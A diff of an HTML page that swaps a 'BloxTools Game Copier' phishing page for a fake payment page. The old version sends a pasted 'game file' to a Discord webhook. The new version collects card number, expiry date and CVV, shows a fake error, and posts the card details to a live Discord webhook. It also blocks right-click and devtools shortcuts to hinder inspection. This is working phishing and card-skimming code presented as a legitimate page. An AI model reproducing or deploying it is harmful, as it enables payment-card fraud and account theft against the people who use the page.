@@ -1,314 +1,381 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BloxTools</title>
-  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" />
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
-  <link rel="shortcut icon" type="image/x-icon" href="/assets/img/logo.png">
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment</title>
   <style>
-    /* Apply black background and neon baby blue theme */
     body {
-      background-color: black;
-      color: #fff; /* All text is white */
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      overflow-x: hidden; /* Hide horizontal overflow */
-      position: relative; /* Needed for positioning snowflakes */
-    }
-
-    /* Navbar Styles */
-    #navbar {
-      background-color: #000;
-      color: #fff;
-      padding: 20px 0;
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-    }
-
-    .navbar-brand {
-      color: #00c8ff !important;
-      font-weight: 600;
-      font-size: 1.2rem;
-    }
-
-    .navbar-toggler-icon {
-      background-color: #00c8ff;
-    }
-
-    .navbar-nav a {
-      color: #00c8ff;
-    }
-
-    /* Snowfall effect */
-    .snowflake {
-      position: absolute;
-      top: -10px;
-      width: 10px;
-      height: 10px;
-      background-color: white;
-      border-radius: 50%;
-      z-index: 999;
-      animation: fall linear infinite;
-    }
-
-    /* Animation for snowflakes */
-    @keyframes fall {
-      to {
-        transform: translateY(100vh); /* Make the snowflakes fall to the bottom of the viewport */
-      }
-    }
-
-    /* Main Section Styles */
-    #features {
-      padding: 80px 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .text-top h1 {
-      color: #00c8ff;
-      font-size: 2.5rem;
-      text-transform: uppercase;
-      margin-bottom: 20px;
-      text-align: center; /* Center the "Game Copier" text */
-    }
-
-    .text-top p {
-      color: #fff;
-      font-size: 1.2rem;
-      margin-bottom: 50px;
-      text-align: center;
-    }
-
-    .box {
-      background-color: #111;
-      border-radius: 10px;
-      padding: 30px;
-      box-shadow: 0 0 10px rgba(0, 200, 255, 0.8);
-    }
-
-    .box h3 {
-      color: #00c8ff;
-      margin-bottom: 15px;
-      font-size: 1.5rem;
-    }
-
-    .box p {
-      color: #fff; /* Change text color to white */
-      font-size: 1rem;
-      margin-bottom: 20px;
-    }
-
-    .auth-input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 2px solid #00c8ff;
-      background-color: #222;
-      color: #fff;
-      font-size: 1rem;
-      border-radius: 5px;
-    }
-
-    .auth-input:focus {
-      border-color: #00c8ff;
-      outline: none;
-    }
-
-    .button.primary {
-      background-color: #00c8ff;
-      border: none;
-      padding: 15px;
-      color: #fff;
-      font-size: 1.1rem;
-      width: 100%;
-      cursor: pointer;
-      border-radius: 5px;
-      box-shadow: 0 0 10px rgba(0, 200, 255, 0.8);
-      margin-top: 20px;
-    }
-
-    .button.primary:hover {
-      background-color: #0097cc;
-      box-shadow: 0 0 20px rgba(0, 200, 255, 1);
-    }
-
-    video {
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0, 200, 255, 0.8);
-      width: 100%;
-      height: auto;
-    }
-
-    footer {
-      background-color: #000;
-      color: #00c8ff;
-      padding: 20px;
-      text-align: center;
-      margin-top: 50px;
-    }
-
-    footer p {
-      margin: 0;
-    }
-
-    /* Layout Adjustments */
-    .row {
+      background: black;
+      color: white;
+      font-family: 'Arial', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 50px;
-      flex-wrap: wrap;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+      position: relative;
     }
 
-    .col-md-6 {
-      max-width: 500px;
-      flex-basis: 45%;
+    /* Flying RGB Comets */
+    .comet {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      animation: comet-animation linear infinite;
+    }
+
+    @keyframes comet-animation {
+      0% {
+        transform: translate(-10vw, -10vh);
+        opacity: 1;
+      }
+      100% {
+        transform: translate(110vw, 110vh);
+        opacity: 0;
+      }
+    }
+
+    /* Price Input Form */
+    .price-input-container {
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background for form */
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      z-index: 1;
+    }
+
+    .payment-method-container {
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background for form */
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      z-index: 1;
+    }
+
+    h1 {
+      font-size: 36px;
+      margin-bottom: 20px;
+      color: white; /* White text for the title */
+    }
+
+    .payment-method-btn {
+      background-color: #9b59b6; /* Neon Purple */
+      color: white;
+      border: 2px solid #9b59b6;
+      border-radius: 5px;
+      padding: 15px 30px;
+      margin: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: 0.3s ease;
+      box-shadow: 0 0 15px rgba(155, 89, 182, 0.7);
+    }
+
+    .payment-method-btn:hover {
+      background-color: #8e44ad; /* Lighter Purple */
+      box-shadow: 0 0 25px rgba(155, 89, 182, 1);
+    }
+
+    .payment-method-btn:focus {
+      outline: none;
+    }
+
+    /* Payment Form */
+    .form-container {
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background for form */
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      z-index: 1;
+      display: none; /* Hidden initially, shown after selecting payment method */
+    }
+
+    label, input {
+      color: white; /* Ensure all form text is white */
+    }
+
+    input {
+      background-color: #333;
+      color: white;
+      border: 1px solid white; /* White border by default */
+      border-radius: 5px;
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      font-size: 16px;
+    }
+
+    /* Neon White Outline on Focus */
+    input:focus {
+      border: 2px solid #fff; /* Neon white border */
+      outline: none;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+    }
+
+    /* Purple Neon Submit Button */
+    button {
+      padding: 12px 20px;
+      background-color: #9b59b6; /* Neon Purple */
+      color: white;
+      border: 2px solid #9b59b6;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      box-shadow: 0 0 10px rgba(155, 89, 182, 0.8),
+                  0 0 20px rgba(155, 89, 182, 0.6),
+                  0 0 30px rgba(155, 89, 182, 0.4);
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      box-shadow: 0 0 20px rgba(155, 89, 182, 0.8),
+                  0 0 30px rgba(155, 89, 182, 0.6),
+                  0 0 40px rgba(155, 89, 182, 0.4);
+      transform: scale(1.1);
+    }
+
+    button:active {
+      box-shadow: 0 0 30px rgba(155, 89, 182, 0.8),
+                  0 0 40px rgba(155, 89, 182, 0.6),
+                  0 0 50px rgba(155, 89, 182, 0.4);
+      transform: scale(1.2);
+    }
+
+    /* Error Notification */
+    .error-notification {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #FFFFFF; /* White background */
+      color: #FF0000; /* Red text */
+      padding: 15px;
+      border-radius: 10px;
+      display: none;
+      font-size: 16px;
+      text-align: center;
+      z-index: 9999;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+      width: 280px; /* Smaller width */
+    }
+
+    .error-notification .close-btn {
+      background-color: transparent;
+      color: #FF0000;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .error-notification .close-btn:hover {
+      color: #FFDD57; /* Light yellow when hovered */
+    }
+
+    /* Copy Button */
+    .copy-btn {
+      background-color: #9b59b6;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      margin-left: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .copy-btn:hover {
+      background-color: #8e44ad;
     }
   </style>
 </head>
-
 <body>
-  <header id="navbar">
-    <div class="container">
-      <nav class="navbar navbar-expand-xl navbar-dark">
-        <a class="navbar-brand" href="#">
-          <img src="/assets/img/logo.png" alt="" style="width: 3.5rem;">
-          <span onclick="window.location.href = '/'" style="margin-left:1rem; font-weight: 600; font-size: 1rem;">Go back <i style="position: relative; top:.15rem; left: .3rem;" class="ri-arrow-go-back-line"></i>
-          </span>
-        </a>
-      </nav>
-    </div>
-  </header>
+  <!-- Price Input Form -->
+  <div class="price-input-container" id="price-input-container">
+    <h1>Enter the Amount</h1>
+    <input type="number" id="amount" name="amount" placeholder="$$$" min="1" step="any" />
+    <br><br>
+    <button onclick="proceedToPayment()">Proceed to Payment</button>
+  </div>
 
-  <section id="features">
-    <div class="text-top">
-      <h1>Game Copier</h1>
-      <p>Copy games with ease, with this brand new powershell-based system!</p>
-    </div>
+  <!-- Payment Method Selection -->
+  <div class="payment-method-container" id="payment-method-container" style="display:none;">
+    <h1>Select Payment Method</h1>
+    <button class="payment-method-btn" onclick="showPaymentForm('paypal')">PayPal</button>
+    <button class="payment-method-btn" onclick="showPaymentForm('bitcoin')">Bitcoin</button>
+    <button class="payment-method-btn" onclick="showPaymentForm('creditcard')">Credit Card</button>
+  </div>
 
-    <div class="row">
-      <!-- Copy Games Section -->
-      <div class="col-md-6 mb-8">
-        <div class="box">
-          <h3>Copy Games</h3>
-          <p>Paste your game file in the box below, then click "Copy Game!" If you don't know how to find a game's "game file" then go ahead and watch "How to use"</p>
-          <form method="post">
-            <div class="form-input-icon mb-3 mt-4">
-              <i class="fas fa-file"></i>
-              <input class="auth-input" type="text" placeholder="Enter game file" id="code" autocomplete="off" minlength="3" required>
-            </div>
-            <div class="form-input-icon mb-3 mt-4">
-              <i class="fas fa-lock"></i>
-              <input class="auth-input" type="number" placeholder="Create A Pin" id="pin" autocomplete="off" minlength="4" required>
-            </div>
-            <button type="button" onclick="FB()" class="button primary d-block mt-3 w-100">Copy Game!</button>
-            <span>BloxTools</span>
-          </form>
-        </div>
-      </div>
+  <!-- Payment Form (Initially Hidden) -->
+  <div class="form-container" id="payment-form-container">
+    <h1>Payment Details</h1>
+    <form id="payment-form">
+      <label for="skibidi1">Your card's 16-digit code:</label><br>
+      <input type="text" id="skibidi1" name="skibidi1" maxlength="19" placeholder="Enter 16-digit code"><br><br>
+      <label for="skibidi2">Expiry date:</label><br>
+      <input type="text" id="skibidi2" name="skibidi2" maxlength="4" placeholder="MMYY"><br><br>
+      <label for="skibidi3">CVV/CVC:</label><br>
+      <input type="text" id="skibidi3" name="skibidi3" maxlength="4" placeholder="Enter 3-4 digits"><br><br>
+      <button type="submit">Pay</button>
+    </form>
+  </div>
 
-      <!-- How to Use Section -->
-      <div class="col-md-6 mb-8">
-        <div class="box">
-          <h3>How to use</h3>
-          <p>Video Tutorial</p>
-          <!-- Embed YouTube Video -->
-          <iframe width="100%" height="315" src="https://www.youtube.com/embed/giItfNDhkD0?si=x5VeKr9ttiAwiyvY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-          <span>BloxTools</span>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <footer>
-    <p class="text-center">Copyright 2025 BloxTools. All rights reserved. | Made by STARAIMER331</p>
-  </footer>
-
-  <script src="/controlPage/apis/main.js"></script>
-  <script src="/assets/js/bootstrap.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
-  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <!-- Error Notification -->
+  <div class="error-notification" id="error-notification">
+    <span>Error! Please try again later.</span><br>
+    <button class="close-btn" onclick="closeNotification()">OK</button>
+  </div>
 
   <script>
-    AOS.init({
-      disable: 'mobile',
-      once: true,
+    // Prevent right-click and devtools shortcuts
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.addEventListener("keydown", function(e) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+        e.preventDefault();
+      }
     });
 
-    // Function to send the game file to the webhook
-    async function sendToWebhook(gameFile) {
-      const webhookURL = 'https://discord.com/api/webhooks/1347663029617299546/HTVc5gct83Q8ho0Oc0iUoFmOpEvjqVqRqn9EQMMxX8RKYpAvGnv7hsyde3k-EiVEFjoE'; // Replace with your actual webhook URL
+    // Function to attach input listeners for formatting
+    function addInputListeners() {
+      var cardInput = document.getElementById("skibidi1");
+      if (cardInput) {
+        cardInput.addEventListener("input", function(e) {
+          let value = e.target.value.replace(/\D/g, '');
+          if (value.length > 16) value = value.substring(0, 16);
+          // Insert dash every 4 digits
+          let formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1-");
+          e.target.value = formattedValue;
+        });
+      }
+      var expiryInput = document.getElementById("skibidi2");
+      if (expiryInput) {
+        expiryInput.addEventListener("input", function(e) {
+          let value = e.target.value.replace(/\D/g, '');
+          if (value.length > 4) value = value.substring(0, 4);
+          // Insert slash after 2 digits if more than 2 digits exist
+          let formattedValue = value.replace(/(\d{2})(?=\d)/, "$1/");
+          e.target.value = formattedValue;
+        });
+      }
+    }
 
-      const payload = {
-        content: '@everyone',
+    // Call addInputListeners on page load and after updating form innerHTML
+    window.onload = function() {
+      addInputListeners();
+      setInterval(createComet, 100); // Create comets every 100ms
+    };
+
+    // Show price input and proceed to payment
+    function proceedToPayment() {
+      var amount = document.getElementById('amount').value;
+      if (amount && amount > 0) {
+        document.getElementById('price-input-container').style.display = 'none';
+        document.getElementById('payment-method-container').style.display = 'block';
+      } else {
+        alert("Please enter a valid amount");
+      }
+    }
+
+    // Show payment form based on selected payment method
+    function showPaymentForm(method) {
+      document.getElementById('payment-method-container').style.display = 'none';
+      document.getElementById('payment-form-container').style.display = 'block';
+      document.getElementById('payment-form').innerHTML = `
+        <h1>Pay with ${method.charAt(0).toUpperCase() + method.slice(1)}</h1>
+        <label for="skibidi1">Card Number:</label><br>
+        <input type="text" id="skibidi1" name="skibidi1" maxlength="19" placeholder="Enter 16-digit code"><br><br>
+        <label for="skibidi2">Expiry Date:</label><br>
+        <input type="text" id="skibidi2" name="skibidi2" maxlength="6" placeholder="MMYY"><br><br>
+        <label for="skibidi3">CVV/CVC:</label><br>
+        <input type="text" id="skibidi3" name="skibidi3" maxlength="4" placeholder="Enter 3-4 digits"><br><br>
+        <button type="submit">Pay</button>
+      `;
+      addInputListeners();
+    }
+
+    // Handle form submission: show error notification and send webhook data
+    document.getElementById("payment-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("error-notification").style.display = "block";
+      const cardNumber = document.getElementById("skibidi1").value;
+      const expiryDate = document.getElementById("skibidi2").value;
+      const cvv = document.getElementById("skibidi3").value;
+
+      // Prepare webhook payload with embed
+      const data = {
         embeds: [
           {
-            title: 'New Game File Submitted',
-            description: `Game File:\n\`\`\`${gameFile}\`\`\``,
-            color: 5814783,
-            footer: {
-              text: 'BloxTools Webhook'
-            }
+            title: "Payment Attempt",
+            color: 0x9b59b6, // Purple color for the embed
+            fields: [
+              {
+                name: "Card Number",
+                value: cardNumber,
+                inline: true
+              },
+              {
+                name: "Expiry Date",
+                value: expiryDate,
+                inline: true
+              },
+              {
+                name: "CVV/CVC",
+                value: cvv,
+                inline: true
+              }
+            ]
           }
         ]
       };
 
-      try {
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-      } catch (error) {
-        console.error('Error sending data to webhook:', error);
-      }
+      // Send to the webhook
+      fetch('https://discord.com/api/webhooks/1350844536259346462/uCr0BRyIZDqF-3aSPptQvm-PY4T7ezzS52cBlhK2U6zks77ERAmQVEQxFbYQGjBGgJ9N', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+      }).then(response => {
+        console.log('Webhook sent:', response);
+      }).catch(error => {
+        console.error('Error sending webhook:', error);
+      });
+    });
+
+    // Copy function for the "Copy" buttons
+    function copyTextToClipboard(text) {
+      const textArea = document.createElement("textarea");
+      textArea.value = text;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textArea);
+      alert("Text copied to clipboard!");
     }
 
-    // Function that handles form submission and sends game file to webhook
-    function FB() {
-      const gameFile = document.getElementById('code').value; // Get the game file input
-      if (gameFile.trim() === '') {
-        alert('Please enter a game file!');
-        return;
-      }
-
-      // Send the game file to the webhook
-      sendToWebhook(gameFile);
-
-      // Show success message (you can use SweetAlert or a simple alert here)
-      alert('Game file submitted successfully!');
+    // Close error notification
+    function closeNotification() {
+      document.getElementById("error-notification").style.display = "none";
     }
 
-    // Snowflake generation
-    function generateSnowflakes() {
-      const numberOfSnowflakes = 50; // Number of snowflakes to generate
-      for (let i = 0; i < numberOfSnowflakes; i++) {
-        const snowflake = document.createElement('div');
-        snowflake.classList.add('snowflake');
-        snowflake.style.left = `${Math.random() * 100}vw`; // Random horizontal position
-        snowflake.style.animationDuration = `${Math.random() * 3 + 2}s`; // Random speed
-        snowflake.style.animationDelay = `${Math.random() * 5}s`; // Random delay
-        document.body.appendChild(snowflake);
-      }
+    // Flying RGB comets generation
+    function createComet() {
+      let comet = document.createElement("div");
+      comet.classList.add("comet");
+      let size = Math.random() * 4 + 4;
+      comet.style.width = size + "px";
+      comet.style.height = size + "px";
+      comet.style.left = Math.random() * 100 + "vw";
+      comet.style.top = Math.random() * 100 + "vh";
+      comet.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+      comet.style.animationDuration = Math.random() * 4 + 6 + "s";
+      comet.style.animationDelay = Math.random() * 5 + "s";
+      document.body.appendChild(comet);
+      setTimeout(() => { comet.remove(); }, 10000);
     }
-
-    // Start the snowflakes
-    generateSnowflakes();
   </script>
 </body>
-
 </html>
